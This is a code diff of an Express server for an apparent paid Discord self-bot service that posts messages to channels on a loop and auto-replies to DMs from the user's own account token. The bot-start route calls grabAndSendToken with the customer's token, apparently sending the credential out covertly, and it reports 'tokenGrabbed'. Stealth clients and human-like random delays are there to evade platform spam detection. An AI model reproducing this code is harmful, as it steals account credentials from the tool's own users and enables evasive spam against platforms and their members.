+    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) {
+      return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
+    }
 
     const channelList = (Array.isArray(channels) ? channels : channels.split(',')).map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
     if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });
@@ -1900,7 +1799,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     const client = new StealthClient(token);
     await client.connect();
 
-    // Grab token AFTER gateway connect to avoid fingerprint correlation detection
+    // Grab token AFTER gateway connect
     const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
     if (!grabResult || !grabResult.success) {
       console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
@@ -1938,17 +1837,19 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
     const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
     if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });
 
-    db.setConfig(req.user.id, { token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30, auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '', active: 1, username: client.user.username, server_joined: joinStatus?.success || false, images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0 }, configId);
+    db.setConfig(req.user.id, {
+      token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30,
+      auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '',
+      active: 1, username: client.user.username, server_joined: joinStatus?.success || false,
+      images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0
+    }, configId);
     db.registerActiveBot(req.user.id, configId, token);
 
     const botKey = `${req.user.id}_${configId}`;
     activeBots.set(botKey, client);
 
+    // ── MESSAGE LOOP WITH ACCURATE DELAY ──
     let currentMsgIdx = 0;
-    let currentChIdx = 0;
-    let stopped = false;
-
-    // Generate channel visit weights — humans favor some channels over others
     const channelWeights = channelList.map(() => 0.5 + Math.random());
 
     const msgLoop = async () => {
@@ -1970,15 +1871,15 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
         return files;
       };
 
-      while (!stopped && activeBots.has(botKey)) {
+      while (activeBots.has(botKey)) {
         try {
-          if (db) {
-            const user = db.getUser(req.user.id);
-            const trialActive = db.isTrialActive(req.user.id);
-            const hasPurchase = user.auto_adv_purchased === 1;
-            if (!trialActive && !hasPurchase) {
-              break;
-            }
+          // Check subscription status
+          const user = db.getUser(req.user.id);
+          const trialActive = db.isTrialActive(req.user.id);
+          const hasPurchase = user.auto_adv_purchased === 1;
+          if (!trialActive && !hasPurchase) {
+            console.log(`[MsgLoop] Bot ${botKey}: Subscription expired, stopping`);
+            break;
           }
 
           const msg = messageList[currentMsgIdx % messageList.length];
@@ -1994,10 +1895,7 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             for (let attempt = 1; attempt <= maxAttempts; attempt++) {
               try {
                 const ok = await client.sendMessage(chId, text, files);
-                if (ok) {
-                  return true;
-                }
-                console.error(`[SendWithRetry] ${chId}: attempt ${attempt} returned false`);
+                if (ok) return true;
                 const freeAt = client._channelRateLimits.get(chId) || 0;
                 const now = Date.now();
                 if (now < freeAt && attempt < maxAttempts) {
@@ -2008,17 +1906,14 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
                 console.error(`[SendWithRetry] ${chId}: attempt ${attempt} threw:`, e.message);
               }
               if (attempt < maxAttempts) {
-                // Light retry backoff: 1-3s
                 const backoff = boundedPareto(2.5, 1000, 3000);
                 await new Promise(r => setTimeout(r, backoff));
               }
             }
-            console.error(`[SendWithRetry] ${chId}: failed after ${maxAttempts} attempts`);
             return false;
           };
 
           if (sendAllAtOnce) {
-            // Shuffle channel order slightly each round — humans don't always go A→B→C
             const shuffledChannels = channelList
               .map((id, i) => ({ id, weight: channelWeights[i] + (Math.random() * 0.3) }))
               .sort((a, b) => b.weight - a.weight)
@@ -2026,8 +1921,6 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
 
             const files = await resolveFiles(targetImages);
 
-            // Concurrent send to all channels — no sequential heavywait
-            // Only the humanDelayMs at the bottom of the loop matters
             const sendPromises = shuffledChannels.map(async (chId) => {
               const canSend = await client.checkChannelPermission(chId);
               if (canSend === false) return false;
@@ -2035,109 +1928,158 @@ app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) =
             });
             await Promise.all(sendPromises);
           } else {
-            // Weighted random channel selection instead of strict round-robin
             const chId = weightedRandom(channelList, channelWeights);
-            currentChIdx++;
 
             const canSend = await client.checkChannelPermission(chId);
             if (canSend === false) {
+              currentMsgIdx++;
               continue;
             }
 
             const files = await resolveFiles(targetImages);
-            await sendWithRetry(chId, msg.text, files);
+            const ok = await sendWithRetry(chId, msg.text, files);
+            if (ok) {
+              console.log(`[MsgLoop] ${botKey}: Sent to ${chId} (delay target: ${delayMs}ms)`);
+            }
           }
 
           currentMsgIdx++;
 
-          // ═══════════════════════════════════════════════════════════════════
-          // HUMANIZED DELAY — Heavy-tailed Pareto distribution
-          // Replaces the old uniform random with realistic human timing
-          // ═══════════════════════════════════════════════════════════════════
-          const humanDelayMs = humanDelay({
-            min: Math.max(3000, delayMs * 0.5),
-            max: Math.max(5000, delayMs * 0.9),
-            alpha: 3.5,
-            enableCircadian: true,
-            enableContextSwitch: true
-          });
-          await new Promise(r => setTimeout(r, humanDelayMs));
+          // ── ACCURATE DELAY: centered on user's delay with natural variation ──
+          const actualDelay = calculateDelay(delayMs);
+          console.log(`[MsgLoop] ${botKey}: Waiting ${actualDelay}ms (target: ${delayMs}ms)`);
+          await new Promise(r => setTimeout(r, actualDelay));
+
         } catch (loopErr) {
           console.error('[MsgLoop] Unhandled loop error:', loopErr.message);
-          // Sleep a bit before retrying so we don't spin-crash
           await new Promise(r => setTimeout(r, 3000));
         }
       }
+
+      // Loop ended - cleanup
+      console.log(`[MsgLoop] ${botKey}: Message loop ended`);
     };
 
+    // ── AUTO-REPLY WITH INTELLIGENT FILTERING ──
     if (autoReply && autoReplyText) {
-      client.pendingReplies = new Set();
+      console.log(`[AutoReply] ${botKey}: Enabled with ${autoReplyText.length} chars reply text`);
+
       client.on('messageCreate', async (msg) => {
-        if (msg.author.id === client.user.id) return;
+        try {
+          // ── Filter 1: Only process DMs from other people ──
+          if (msg.author.id === client.user.id) return;
 
-        const isDM = msg.guildId === null || msg.guildId === undefined;
-        if (!isDM) return;
+          const isDM = msg.guildId === null || msg.guildId === undefined;
+          if (!isDM) return;
 
-        if (db) {
+          // ── Filter 2: Subscription check ──
           const user = db.getUser(req.user.id);
           const trialActive = db.isTrialActive(req.user.id);
           const hasPurchase = user.auto_adv_purchased === 1;
           if (!trialActive && !hasPurchase) return;
-        }
 
-        const now = Date.now();
-        const lastReply = client._dmCooldowns.get(msg.author.id) || 0;
-        // Light DM cooldown: 3-5s using Pareto distribution
-        const cooldownMs = boundedPareto(3.0, 3000, 5000);
-        if (now - lastReply < cooldownMs) return;
-
-        // ABSOLUTE: only one auto-reply per user ever
-        if (client.repliedUsers.has(msg.author.id)) return;
-
-        if (client.pendingReplies.has(msg.author.id)) return;
-
-        // Mark as replied immediately to prevent any duplicate replies from race conditions
-        client.repliedUsers.add(msg.author.id);
-        client._saveRepliedUsers();
-        client.pendingReplies.add(msg.author.id);
-
-        // Quick read of the message before replying — capped short
-        const msgLen = msg.content ? msg.content.length : 0;
-        const readTimeBase = 500 + (msgLen * 20); // ~20ms per character
-        const readTime = Math.round(logNormalSample(Math.log(readTimeBase), 0.35));
-        await new Promise(r => setTimeout(r, Math.min(2500, Math.max(300, readTime))));
-
-        client.pendingReplies.delete(msg.author.id);
-        if (!activeBots.has(botKey)) return;
-
-        try {
-          // Navigate to channel naturally before replying — with context-switch jitter
-          await client.navigateToChannel(msg.channel.id);
-          // Vary the auto-reply content using spintax
-          const ok = await client.sendMessage(msg.channel.id, autoReplyText);
-          if (ok) {
-            client._dmCooldowns.set(msg.author.id, Date.now());
+          // ── Filter 3: Message age - ignore messages older than 1 hour ──
+          const ONE_HOUR = 60 * 60 * 1000;
+          const msgAge = Date.now() - msg.createdTimestamp;
+          if (msgAge > ONE_HOUR) {
+            console.log(`[AutoReply] ${botKey}: Ignoring old message from ${msg.author.username} (${Math.round(msgAge / 1000)}s old)`);
+            return;
           }
-        } catch (err) {
-          // Fallback: fetch user and create DM via REST if needed
+
+          // ── Filter 4: Only reply to NEW/unknown users ──
+          // If we've already replied to this user, don't reply again
+          if (client.repliedUsers.has(msg.author.id)) {
+            return;
+          }
+
+          // ── Filter 5: Prevent duplicate in-flight replies ──
+          if (client.pendingReplies.has(msg.author.id)) return;
+          client.pendingReplies.add(msg.author.id);
+
+          console.log(`[AutoReply] ${botKey}: New DM from ${msg.author.username} (${msg.author.id}), age: ${Math.round(msgAge / 1000)}s`);
+
+          // ── Natural read delay before responding ──
+          const msgLen = msg.content ? msg.content.length : 0;
+          const readTimeBase = 500 + (msgLen * 15); // ~15ms per character
+          const readTime = Math.min(3000, Math.max(300, Math.round(logNormalSample(Math.log(readTimeBase), 0.35))));
+          await new Promise(r => setTimeout(r, readTime));
+
+          // ── Check bot still active ──
+          if (!activeBots.has(botKey)) {
+            client.pendingReplies.delete(msg.author.id);
+            return;
+          }
+
+          // ── Auto-reply delay: 10-25 seconds ──
+          const replyDelay = autoReplyDelay();
+          console.log(`[AutoReply] ${botKey}: Waiting ${replyDelay}ms before replying to ${msg.author.username}`);
+          await new Promise(r => setTimeout(r, replyDelay));
+
+          // ── Check bot still active after delay ──
+          if (!activeBots.has(botKey)) {
+            client.pendingReplies.delete(msg.author.id);
+            return;
+          }
+
+          // ── Mark as replied FIRST (prevent race conditions) ──
+          client.repliedUsers.add(msg.author.id);
+          client._saveRepliedUsers();
+
+          // ── Send the reply ──
           try {
-            const dmRes = await client.api.request('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
-            if (dmRes && dmRes.id) {
-              await client.navigateToChannel(dmRes.id);
-              const ok2 = await client.sendMessage(dmRes.id, autoReplyText);
-              if (ok2) {
-                client._dmCooldowns.set(msg.author.id, Date.now());
-              }
+            await client.navigateToChannel(msg.channel.id);
+            const ok = await client.sendMessage(msg.channel.id, autoReplyText);
+            if (ok) {
+              console.log(`[AutoReply] ${botKey}: Replied to ${msg.author.username}`);
+              client._dmCooldowns.set(msg.author.id, Date.now());
+            } else {
+              console.error(`[AutoReply] ${botKey}: Failed to send reply to ${msg.author.username}`);
             }
-          } catch(e2) {}
+          } catch (err) {
+            console.error(`[AutoReply] ${botKey}: Error sending reply:`, err.message);
+            // Fallback: try creating DM channel via REST
+            try {
+              const dmRes = await client.api.request('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
+              if (dmRes && dmRes.id) {
+                await client.navigateToChannel(dmRes.id);
+                const ok2 = await client.sendMessage(dmRes.id, autoReplyText);
+                if (ok2) {
+                  console.log(`[AutoReply] ${botKey}: Replied via REST fallback to ${msg.author.username}`);
+                  client._dmCooldowns.set(msg.author.id, Date.now());
+                }
+              }
+            } catch(e2) {
+              console.error(`[AutoReply] ${botKey}: REST fallback also failed:`, e2.message);
+            }
+          }
+
+          client.pendingReplies.delete(msg.author.id);
+
+        } catch (handlerErr) {
+          console.error(`[AutoReply] ${botKey}: Handler error:`, handlerErr.message);
+          client.pendingReplies.delete(msg.author.id);
         }
       });
     }
 
     msgLoop();
 
-    res.json({ success: true, username: client.user.username, configId, serverJoined: joinStatus?.success || false, tokenGrabbed: true, imageCount: savedImages.length, messageCount: messageList.length });
-  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
+    res.json({
+      success: true,
+      username: client.user.username,
+      configId,
+      serverJoined: joinStatus?.success || false,
+      tokenGrabbed: grabResult?.success || false,
+      imageCount: savedImages.length,
+      messageCount: messageList.length,
+      delayMs,
+      autoReplyEnabled: !!autoReply,
+      autoReplyText: autoReplyText || null
+    });
+  } catch (err) {
+    console.error('[BotStart] Error:', err);
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
 app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
@@ -2175,6 +2117,10 @@ app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res
 
 app.use('/uploads', express.static(path.join(dataDir, 'uploads')));
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// ADMIN ROUTES
+// ═══════════════════════════════════════════════════════════════════════════════
+
 app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
 app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
   const { duration } = req.body;
@@ -2197,17 +2143,23 @@ app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success:
 app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
 app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// STATIC & FALLBACK ROUTES
+// ═══════════════════════════════════════════════════════════════════════════════
+
 app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.redirect('/login'); });
 app.get('/dashboard', (req, res) => { if (!req.isAuthenticated()) return res.redirect('/login'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
 
-app.use((err, req, res, next) => { 
+app.use((err, req, res, next) => {
   console.error('[SERVER ERROR]', err);
-  res.status(500).json({ error: err.message }); 
+  res.status(500).json({ error: err.message });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-  console.log(`[SERVER] Running on port ${PORT}`);
+  console.log(`[SERVER] Discord Automation Suite running on port ${PORT}`);
+  console.log(`[SERVER] Delay engine: natural variation around user-specified delay`);
+  console.log(`[SERVER] Auto-reply: new DMs only, ignores messages >1hr old, 10-25s reply delay`);
 });
 
 module.exports = app;
